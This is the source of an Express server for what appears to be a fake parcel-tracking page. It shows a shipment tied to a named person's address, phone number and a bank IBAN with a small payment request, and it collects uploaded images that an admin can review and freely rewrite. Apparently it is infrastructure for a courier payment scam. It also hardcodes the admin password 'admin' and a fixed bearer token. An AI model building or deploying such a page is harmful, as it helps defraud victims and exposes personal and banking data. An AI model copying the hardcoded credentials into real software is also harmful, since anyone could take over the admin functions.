import express from "express";
import fs from "fs";
import path from "path";

const app = express();
const PORT = Number(process.env.PORT) || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const UPLOADS_FILE = path.join(process.cwd(), 'uploads.json');
const SHIPMENTS_FILE = path.join(process.cwd(), 'shipments.json');

// Ensure files exist
if (!fs.existsSync(UPLOADS_FILE)) fs.writeFileSync(UPLOADS_FILE, '[]');
if (!fs.existsSync(SHIPMENTS_FILE)) {
  const defaultShipments = [
    {
      id: "1",
      trackingNumber: "6635471299413458",
      name: "Nicola Tella",
      postalCode: "50001, Zaragoza",
      address: "Ps. Independencia 33, 50001, Zaragoza",
      contact: "+34 614 11 39 38",
      packageVerified: "Cable USB",
      beneficiary: "5728",
      concept: "Pago 5728",
      ibanLabel: "IBAN BANCO (BBVA)",
      ibanValue: "ES74 0182 2647 5902 0168 2392",
      shippingCost: "14,58€ (PAGADO)",
      packageCost: "4,00€",
      totalAmount: "4,00€",
      status: "pending",
      badge: "EN TRÁNSITO"
    }
  ];
  fs.writeFileSync(SHIPMENTS_FILE, JSON.stringify(defaultShipments));
}

// API Routes
app.get('/api/shipment', (req, res) => {
  try {
    const data = fs.readFileSync(SHIPMENTS_FILE, 'utf-8');
    res.json(JSON.parse(data));
  } catch (e) {
    res.status(500).json({ error: "Failed to read shipments" });
  }
});

app.post('/api/uploads', (req, res) => {
  const { image, trackingNumber } = req.body;
  if (!image) return res.status(400).json({ error: "Missing image" });
  
  try {
    const data = fs.readFileSync(UPLOADS_FILE, 'utf-8');
    const uploads = JSON.parse(data);
    const newUpload = {
      id: Date.now().toString(),
      image,
      trackingNumber: trackingNumber || "N/A",
      date: new Date().toISOString()
    };
    uploads.push(newUpload);
    fs.writeFileSync(UPLOADS_FILE, JSON.stringify(uploads));
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "Failed to save upload" });
  }
});

// Admin API
const ADMIN_PASSWORD = "admin"; // Basic password

app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, token: "admin-token-123" });
  } else {
    res.status(401).json({ success: false, error: "Contraseña incorrecta" });
  }
});

// Middleware for admin auth
const adminAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (authHeader === 'Bearer admin-token-123') {
    next();
  } else {
    res.status(401).json({ error: "Unauthorized" });
  }
};

app.get('/api/admin/uploads', adminAuth, (req, res) => {
  try {
    const data = fs.readFileSync(UPLOADS_FILE, 'utf-8');
    res.json(JSON.parse(data));
  } catch (e) {
    res.status(500).json({ error: "Failed to read uploads" });
  }
});

app.delete('/api/admin/uploads/:id', adminAuth, (req, res) => {
  try {
    const data = fs.readFileSync(UPLOADS_FILE, 'utf-8');
    let uploads = JSON.parse(data);
    uploads = uploads.filter(u => u.id !== req.params.id);
    fs.writeFileSync(UPLOADS_FILE, JSON.stringify(uploads));
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "Failed to delete upload" });
  }
});

app.post('/api/admin/shipment', adminAuth, (req, res) => {
  try {
    const shipments = req.body;
    fs.writeFileSync(SHIPMENTS_FILE, JSON.stringify(shipments));
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "Failed to save shipments" });
  }
});

app.post('/api/admin/shipment/reset', adminAuth, (req, res) => {
  const defaultShipments = [
    {
      id: "1",
      trackingNumber: "6635471299413458",
      name: "Nicola Tella",
      postalCode: "50001, Zaragoza",
      address: "Ps. Independencia 33, 50001, Zaragoza",
      contact: "+34 614 11 39 38",
      packageVerified: "Cable USB",
      beneficiary: "5728",
      concept: "Pago 5728",
      ibanLabel: "IBAN BANCO (BBVA)",
      ibanValue: "ES74 0182 2647 5902 0168 2392",
      shippingCost: "14,58€ (PAGADO)",
      packageCost: "4,00€",
      totalAmount: "4,00€",
      status: "pending",
      badge: "EN TRÁNSITO"
    }
  ];
  try {
    fs.writeFileSync(SHIPMENTS_FILE, JSON.stringify(defaultShipments));
    res.json({ success: true, data: defaultShipments });
  } catch (e) {
    res.status(500).json({ error: "Failed to reset shipments" });
  }
});

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
